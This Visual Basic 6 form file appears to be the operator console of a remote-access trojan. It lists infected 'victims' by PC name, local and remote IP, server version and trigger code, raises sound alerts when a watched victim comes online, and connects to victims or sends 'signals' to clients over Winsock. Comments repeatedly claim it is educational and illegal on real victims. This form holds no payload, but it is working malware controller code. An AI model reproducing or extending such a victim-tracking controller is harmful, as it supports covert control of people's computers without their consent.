VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Form7 
   Appearance      =   0  'Flat
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Monitor on line Targets"
   ClientHeight    =   10440
   ClientLeft      =   27405
   ClientTop       =   1.62180e5
   ClientWidth     =   11955
   Icon            =   "Form7.frx":0000
   LinkTopic       =   "Form7"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   10440
   ScaleWidth      =   11955
   StartUpPosition =   1  'CenterOwner
   Visible         =   0   'False
   Begin VB.Frame Frame8 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Old victims"
      ForeColor       =   &H80000008&
      Height          =   2295
      Left            =   6120
      TabIndex        =   18
      Top             =   8040
      Width           =   5775
      Begin VB.ListBox List1 
         Appearance      =   0  'Flat
         Height          =   1590
         Left            =   120
         TabIndex        =   19
         Top             =   240
         Width           =   5535
      End
      Begin VB.Label Label6 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   20
         Top             =   1920
         Width           =   855
      End
   End
   Begin VB.Frame Frame6 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Live log"
      ForeColor       =   &H80000008&
      Height          =   2295
      Left            =   0
      TabIndex        =   16
      Top             =   8040
      Width           =   6015
      Begin RichTextLib.RichTextBox RichTextBox1 
         Height          =   1935
         Left            =   120
         TabIndex        =   17
         ToolTipText     =   "Log window"
         Top             =   240
         Width           =   5775
         _ExtentX        =   10186
         _ExtentY        =   3413
         _Version        =   393217
         Enabled         =   -1  'True
         ReadOnly        =   -1  'True
         ScrollBars      =   2
         Appearance      =   0
         TextRTF         =   $"Form7.frx":08CA
      End
   End
   Begin VB.Frame Frame7 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Operation"
      ForeColor       =   &H80000008&
      Height          =   1935
      Left            =   6120
      TabIndex        =   10
      Top             =   6000
      Width           =   5775
      Begin VB.TextBox Text5 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   840
         TabIndex        =   12
         ToolTipText     =   "Client ip information"
         Top             =   240
         Width           =   4815
      End
      Begin VB.TextBox Text4 
         Appearance      =   0  'Flat
         Height          =   645
         Left            =   840
         TabIndex        =   11
         ToolTipText     =   "Signal to be sent"
         Top             =   600
         Width           =   4815
      End
      Begin Project1.lvButtons_H lvButtons_H2 
         Height          =   375
         Left            =   4560
         TabIndex        =   13
         ToolTipText     =   "Send the signal to the client"
         Top             =   1440
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   661
         Caption         =   "Send"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.Label Label1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Client ip"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   240
         TabIndex        =   15
         Top             =   240
         Width           =   615
      End
      Begin VB.Label Label2 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Signal"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   240
         TabIndex        =   14
         Top             =   600
         Width           =   615
      End
   End
   Begin VB.Frame Frame5 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Clients"
      ForeColor       =   &H80000008&
      Height          =   2295
      Left            =   0
      TabIndex        =   7
      Top             =   3600
      Width           =   11895
      Begin MSComctlLib.ListView lstWin2 
         Height          =   1620
         Left            =   120
         TabIndex        =   8
         ToolTipText     =   "Clients list"
         Top             =   240
         Width           =   11655
         _ExtentX        =   20558
         _ExtentY        =   2858
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   0   'False
         HideSelection   =   0   'False
         Checkboxes      =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList12"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   0
      End
      Begin VB.Label Label5 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   1920
         Width           =   5055
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "Controls"
      Height          =   855
      Left            =   8880
      TabIndex        =   5
      Top             =   360
      Visible         =   0   'False
      Width           =   615
      Begin VB.Timer updater 
         Interval        =   1000
         Left            =   120
         Top             =   360
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Filter"
      ForeColor       =   &H80000008&
      Height          =   1935
      Left            =   0
      TabIndex        =   2
      Top             =   6000
      Width           =   6015
      Begin MSComctlLib.ListView listview1 
         Height          =   1260
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   5775
         _ExtentX        =   10186
         _ExtentY        =   2223
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   0   'False
         HideSelection   =   0   'False
         Checkboxes      =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList12"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   0
      End
      Begin VB.Label Label3 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1560
         Width           =   5055
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Victim information"
      ForeColor       =   &H80000008&
      Height          =   3495
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   11895
      Begin VB.CheckBox Check5 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Enable notification sounds"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   9360
         TabIndex        =   21
         ToolTipText     =   "Enable notification sounds"
         Top             =   3120
         Width           =   2415
      End
      Begin MSComctlLib.ListView lstWin 
         Height          =   2820
         Left            =   120
         TabIndex        =   1
         ToolTipText     =   "Victims list"
         Top             =   240
         Width           =   11655
         _ExtentX        =   20558
         _ExtentY        =   4974
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   0   'False
         HideSelection   =   0   'False
         Checkboxes      =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList12"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   0
      End
      Begin VB.Label Label4 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   3120
         Width           =   5295
      End
   End
   Begin MSComDlg.CommonDialog CDialog1 
      Left            =   10680
      Top             =   720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DialogTitle     =   "Save log file"
      Filter          =   "*.txt"
   End
   Begin VB.Menu filering 
      Caption         =   "filter"
      Visible         =   0   'False
      Begin VB.Menu addtriger 
         Caption         =   "Add Triger"
      End
      Begin VB.Menu deletetriger 
         Caption         =   "Delete Triger"
      End
      Begin VB.Menu selectall 
         Caption         =   "Select All"
      End
      Begin VB.Menu delselectall 
         Caption         =   "Deselect All"
      End
      Begin VB.Menu deleteall 
         Caption         =   "Delete All"
      End
      Begin VB.Menu changenotify 
         Caption         =   "Change Notify"
      End
      Begin VB.Menu changetriger 
         Caption         =   "Change Triger"
      End
      Begin VB.Menu chanegcomment 
         Caption         =   "Change Comment"
      End
      Begin VB.Menu changentandcomment 
         Caption         =   "Change Notify, triger, and Comment"
      End
      Begin VB.Menu savelist 
         Caption         =   "Save List"
      End
      Begin VB.Menu stopsound 
         Caption         =   "Stop Sound"
      End
   End
   Begin VB.Menu clients2 
      Caption         =   "clients"
      Visible         =   0   'False
      Begin VB.Menu Selectall2 
         Caption         =   "Select All"
      End
      Begin VB.Menu deselctall2 
         Caption         =   "Deselect All"
      End
      Begin VB.Menu deleteselected2 
         Caption         =   "Delete Selected"
      End
      Begin VB.Menu deleteall2 
         Caption         =   "Delete All"
      End
      Begin VB.Menu getclientlist 
         Caption         =   "Get client list"
      End
      Begin VB.Menu sendip 
         Caption         =   "Send ip"
         Begin VB.Menu localip 
            Caption         =   "Local ip"
         End
         Begin VB.Menu remoteip 
            Caption         =   "Remote ip"
         End
         Begin VB.Menu optionalip 
            Caption         =   "Optional ip"
         End
      End
   End
   Begin VB.Menu victims 
      Caption         =   "victims"
      Visible         =   0   'False
      Begin VB.Menu connecttovictim 
         Caption         =   "Connect remote ip"
      End
      Begin VB.Menu connectlocalip 
         Caption         =   "Connect local ip"
      End
      Begin VB.Menu copysignal 
         Caption         =   "Copy signal"
      End
      Begin VB.Menu copylocalips 
         Caption         =   "Copy local ip"
      End
      Begin VB.Menu copyremoteips 
         Caption         =   "Copy remote ip"
      End
      Begin VB.Menu selectall3 
         Caption         =   "Select All"
      End
      Begin VB.Menu deselectall3 
         Caption         =   "Deselect All"
      End
      Begin VB.Menu deleteselected3 
         Caption         =   "Delete Selected"
      End
      Begin VB.Menu deleteall3 
         Caption         =   "Delete All"
      End
      Begin VB.Menu getvictimlist 
         Caption         =   "Get victim list"
      End
   End
   Begin VB.Menu listbox1 
      Caption         =   "LISTBOX1"
      Visible         =   0   'False
      Begin VB.Menu clearlistbox1 
         Caption         =   "Clear"
      End
      Begin VB.Menu getoldvictims 
         Caption         =   "Get old victimes list"
      End
   End
   Begin VB.Menu reachbox1m 
      Caption         =   "reachbox1"
      Visible         =   0   'False
      Begin VB.Menu copyreach 
         Caption         =   "Copy"
      End
      Begin VB.Menu copyselected 
         Caption         =   "Copy Selected"
      End
      Begin VB.Menu connecttoselected 
         Caption         =   "Connect to selected"
      End
      Begin VB.Menu savereach 
         Caption         =   "Save"
      End
      Begin VB.Menu clearreach 
         Caption         =   "Clear"
      End
   End
End
Attribute VB_Name = "Form7"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long

'for spliting string
Public striN
Dim lItem As ListItem

'for listview sorting
Dim LVXS As New uSc_ListView_Xtended_Sort



Private Sub addtriger_Click()
    'add triger to filter
    
    Dim trigercode, comment, thesoundc As String
    trigercode = InputBox("Please enter the triger code", "Input")
    comment = InputBox("Please enter your comment", "Input")
    
    Dim notysound As Integer
    notysound = MsgBox("Notify you if victim is active", vbYesNo)
    
    If notysound = 6 Then '6 indicates a YES
        thesoundc = "yes"
    Else
        thesoundc = "no"
    End If
    
    Set lItem = listview1.ListItems.Add(, , trigercode, , 0)
       lItem.ListSubItems.Add , , thesoundc
       lItem.ListSubItems.Add , , comment
End Sub

Private Sub chanegcomment_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
              Dim comment As String
              comment = InputBox("Please enter your comment", "Input")
              listview1.ListItems(i).ListSubItems(2).Text = comment
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub changenotify_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    Dim thesoundc As String
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then
    
    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
               Dim notysound As Integer
               notysound = MsgBox("Notify you if victim is active", vbYesNo)

                If notysound = 6 Then '6 indicates a YES
                    thesoundc = "yes"
                Else
                    thesoundc = "no"
                End If
                 
                listview1.ListItems(i).ListSubItems(1).Text = thesoundc
                 
            End If
        Next i
    End With
   Else
     MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub changentandcomment_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    Dim notysound As String
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
                Dim trigercode, comment, thesoundc As String
                trigercode = InputBox("Please enter the triger code", "Input")
                listview1.ListItems.item(1).Text = trigercode
                
                comment = InputBox("Please enter your comment", "Input")
                listview1.ListItems(i).ListSubItems(2).Text = comment
                
                notysound = MsgBox("Notify you if victim is active", vbYesNo)

                If notysound = 6 Then '6 indicates a YES
                      thesoundc = "yes"
                Else
                      thesoundc = "no"
                End If
                 
                listview1.ListItems(i).ListSubItems(1).Text = thesoundc
                           
           End If
        Next i
    End With
   
   Else
    MsgBox "Please Select an item from the filter list"
   End If
End Sub

Private Sub changetriger_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    


    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
              Dim trigercode, comment, thesoundc As String
              trigercode = InputBox("Please enter the triger code", "Input")
              listview1.ListItems.item(i).Text = trigercode
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub





Private Sub clear4_Click()
    RichTextBox1.Text = ""
End Sub

Private Sub clearlistbox1_Click()
    List1.Clear
End Sub

Private Sub clearreach_Click()
    RichTextBox1.Text = ""
End Sub

Private Sub connectlocalip_Click()
    Form1.Text1.Text = lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(2).Text
    Form1.connectnow
End Sub

Private Sub connecttoselected_Click()
    Form1.Text1.Text = RichTextBox1.SelText
    Form1.connectnow
End Sub

Private Sub connecttovictim_Click()
    Form1.Text1.Text = lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(3).Text
    Form1.connectnow
End Sub

Private Sub copylocalip_Click()

End Sub

Private Sub copylocalips_Click()
    Clipboard.Clear
    Clipboard.SetText lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(2).Text

End Sub

Private Sub copyreach_Click()
    Clipboard.Clear
    Clipboard.SetText RichTextBox1.Text
End Sub

Private Sub copyremoteip_Click()

End Sub

Private Sub copyremoteips_Click()
    Clipboard.Clear
    Clipboard.SetText lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(3).Text

End Sub

Private Sub copyselected_Click()
    Clipboard.Clear
    Clipboard.SetText RichTextBox1.SelText
End Sub

Private Sub copysignal_Click()
    Clipboard.Clear
    Clipboard.SetText lstWin.ListItems(lstWin.SelectedItem.index).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(1).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(2).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(3).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(4).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(5).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(6).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(7).Text

End Sub

Private Sub deleteall_Click()
    listview1.ListItems.Clear
End Sub

Private Sub deleteall2_Click()
    lstWin2.ListItems.Clear
End Sub

Private Sub deleteall3_Click()
    lstWin.ListItems.Clear
End Sub

Private Sub deleteselected2_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To lstWin2.ListItems.Count
        If lstWin2.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With lstWin2
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                .ListItems.Remove (i)
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub deleteselected3_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To lstWin.ListItems.Count
        If lstWin.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    


    With lstWin
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                .ListItems.Remove (i)
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Private Sub deletetriger_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                .ListItems.Remove (i)
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub delselectall_Click()
    Dim i As Long
    With listview1
       For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = True Then
                .ListItems.item(i).Checked = False
            End If
        Next i
    End With
End Sub

Private Sub deselctall2_Click()
    Dim i As Long
    With lstWin2
       For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = True Then
                .ListItems.item(i).Checked = False
            End If
        Next i
    End With
End Sub

Private Sub deselectall3_Click()
    Dim i As Long
    With lstWin
       For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = True Then
                .ListItems.item(i).Checked = False
            End If
        Next i
    End With
End Sub

Private Sub Form_Load()
    
    
    'get saved info get info from registry
    Dim tempregvalue As String
    tempregvalue = GetSetting(Me.name, "Settings", "check5")
    
    If (tempregvalue = "1") Then
        Check5.Value = 1
    Else
        Check5.Value = 0
    End If
  
      

    'for list view split
    lstWin.ColumnHeaders.Add , , "Pc Name", lstWin.Width / 8 + 300
    
    lstWin.ColumnHeaders.Add , , "Host", lstWin.Width / 8
    
    lstWin.ColumnHeaders.Add , , "Local ip", lstWin.Width / 8 + 150
    
    lstWin.ColumnHeaders.Add , , "Remote ip", lstWin.Width / 8 + 150
    
    lstWin.ColumnHeaders.Add , , "Server Version", lstWin.Width / 8 - 200
    
    lstWin.ColumnHeaders.Add , , "Given Code", lstWin.Width / 8 - 200
    
    lstWin.ColumnHeaders.Add , , "Date", lstWin.Width / 8 - 400
    
    lstWin.ColumnHeaders.Add , , "Time", lstWin.Width / 8 - 400
    
    lstWin.ColumnHeaders.Add , , "Filter", lstWin.Width / 8 - 890
    
    lstWin.ColumnHeaders.Add , , "", 10

    'for listview sorting
    LVXS.SetUp lstWin
    
    
    
    'for client list
    lstWin2.ColumnHeaders.Add , , "Name", lstWin.Width / 5
    lstWin2.ColumnHeaders.Add , , "ip", lstWin.Width / 5
    lstWin2.ColumnHeaders.Add , , "Date", lstWin.Width / 5 - 380
    lstWin2.ColumnHeaders.Add , , "Time", lstWin.Width / 5 - 380
    lstWin2.ColumnHeaders.Add , , "Status / Comments", lstWin.Width / 5 + 740
    lstWin2.ColumnHeaders.Add , , "", 10
     
    
    
    
    
    
    'filter list
    listview1.ColumnHeaders.Add , , "Triger", lstWin.Width / 7 + 600
    listview1.ColumnHeaders.Add , , "Notify", lstWin.Width / 7 - 1000
    listview1.ColumnHeaders.Add , , "Comment", lstWin.Width / 7 + 1150
    listview1.ColumnHeaders.Add , , "", 10
    
    
    
    'get filter list
    Dim theinput As String
    On Error Resume Next
    Open App.path & "/data/filter.txt" For Input As #1
         Do While Not EOF(1)
          
            Input #1, theinput
            
            If InStr(Trim(theinput), "|") > 0 Then
                striN = Split(theinput, "|")
                Set lItem = listview1.ListItems.Add(, , striN(0), , 0)
                lItem.ListSubItems.Add , , striN(1)
                lItem.ListSubItems.Add , , striN(2)
            End If
         Loop
    Close #1


Dim z As Integer
z = 0


End Sub





Private Sub Form_Unload(Cancel As Integer)
    SaveSetting Me.name, "Settings", "check5", Check5.Value
    Me.Hide
    Cancel = 1

End Sub



Private Sub getoldvictims_Click()
    List1.Clear
    formnoty.getoldlist
End Sub

Private Sub List1_Click()
    Dim qsee As Long
    qsee = List1.ListIndex
    logit List1.List(qsee)
End Sub

Private Sub OLE1_Updated(Code As Integer)

End Sub



Private Sub getclientlist_Click()
    formnoty.getclientlist
End Sub

Private Sub getvictimlist_Click()
    formnoty.getvictimlist
End Sub

Private Sub List1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  If Button = vbRightButton Then
        PopupMenu listbox1
    End If
End Sub

Private Sub listview1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu filering
    End If
End Sub

Private Sub localip_Click()
    formnoty.sendlocalip
End Sub

Private Sub lstWin_Click()
   
    Dim temp As String
    On Error Resume Next
    temp = lstWin.ListItems(lstWin.SelectedItem.index).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(1).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(4).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(2).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(5).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.index).ListSubItems(3).Text
    On Error Resume Next
    Text4.Text = temp

End Sub

Private Sub lstWin_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu victims
    End If
End Sub

Private Sub lstWin2_Click()
    On Error Resume Next
    Text5.Text = lstWin2.ListItems(lstWin2.SelectedItem.index).ListSubItems(1).Text

End Sub

Private Sub lstWin2_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu clients2
    End If
End Sub

Private Sub lvButtons_H2_Click()
    On Error Resume Next
    Form1.Winsock4.RemoteHost = Text5.Text
    On Error Resume Next
    Form1.Winsock4.SendData "..|" & Text4.Text
End Sub

Private Sub optionalip_Click()
    formnoty.sendoptionalip
End Sub

Private Sub remoteip_Click()
    formnoty.sendremoteip
End Sub

Private Sub RichTextBox1_Change()
    If Check5.Value = 1 Then
        Call PlaySoundResource(101)
    End If
End Sub

Private Sub RichTextBox1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu reachbox1m
    End If
End Sub

Private Sub save4_Click()
    Open App.path & "\data\logs.dat" For Append As #1
       ' Print #1, Form1.RichTextBox1.Text
    Close #1
End Sub

Private Sub savelist_Click()
    'save filter to file

    Dim isselected As Boolean
    Dim xcounter As Long

    
    
       
    Open App.path & "/data/filter.txt" For Output As #1
    
 
        For xcounter = 1 To Me.listview1.ListItems.Count
            Set lItem = listview1.ListItems.item(xcounter)
            Print #1, Me.listview1.ListItems.item(xcounter) & "|" & lItem.ListSubItems.item(1) & "|" & lItem.ListSubItems.item(2)
                
        Next xcounter
   
    Close #1
End Sub

Private Sub savereach_Click()
    Open App.path & "\data\logs.dat" For Append As #1
        Print #1, RichTextBox1.Text
    Close #1
End Sub

Private Sub selectall_Click()
 Dim i As Long
    
    With listview1
                
        For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = False Then
                .ListItems.item(i).Checked = True
            End If
        Next i
    End With
End Sub

Private Sub Selectall2_Click()
    Dim i As Long
    
    With lstWin2
                
        For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = False Then
                .ListItems.item(i).Checked = True
            End If
        Next i
    End With
End Sub

Private Sub selectall3_Click()
    Dim i As Long
    
    With lstWin
                
        For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = False Then
                .ListItems.item(i).Checked = True
            End If
        Next i
    End With
End Sub

Private Sub stopsound_Click()
    Form1.soundtimer.Enabled = False
End Sub







'for sound
Private Sub Timer5_Timer()
    Call PlaySoundResource(102)

End Sub



Private Sub updater_Timer()
    Label3.Caption = "Total: " & listview1.ListItems.Count
    Label4.Caption = "Total: " & lstWin.ListItems.Count
    Label5.Caption = "Total: " & lstWin2.ListItems.Count

End Sub



'logger
Public Sub logit(thetext As String)
    RichTextBox1.Text = RichTextBox1.Text & "--> " & Time & " " & Date & " " & thetext & vbCrLf & vbCrLf
    RichTextBox1.SelStart = Len(RichTextBox1.Text)
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

